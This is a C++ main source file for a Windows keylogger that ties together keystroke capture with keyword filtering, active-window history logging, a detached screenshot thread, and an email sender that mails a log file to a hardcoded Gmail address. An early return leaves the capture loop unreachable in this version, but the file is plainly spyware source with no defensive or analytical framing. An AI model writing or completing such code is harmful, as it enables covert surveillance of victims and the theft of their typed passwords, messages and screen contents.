#include "stdafx.h"

#include "Keylogger.h"
#include "Application_History.h"
#include "Screenshot.h"
#include "Mail_sender.h"

#include <thread>


int main(int argc, char *argv[])
{
	int email_send_loop_time = 1;
	EMail_Sender email("Patry14inf@gmail.com", email_send_loop_time);
	std::thread email_thread(&EMail_Sender::send_email, email, "e:\\info.txt");
	email_thread.join();

	return 0;
	
	bool saving_enabled = false;

	std::vector<std::string> keywords = get_keywords();

	Keylogger keylogger(saving_enabled, keywords);
	std::string file_path = keylogger.create_file();
	std::ofstream file_logs(file_path);

	Application_History application_history(file_logs, keylogger.get_file_logs_clean_keys(),
		file_path, saving_enabled);

	// Take screenshots in a separate thread
	Screenshot screenshoter;
	std::thread screenshot_thread(&Screenshot::auto_start, screenshoter);
	screenshot_thread.detach();

	Sleep(10); // give other programs time to run

	while (1)
	{
		application_history.get_window_name();
		application_history.update_window();
		keylogger.get_key(file_logs);
	}

	file_logs.close();

	return 0;
}
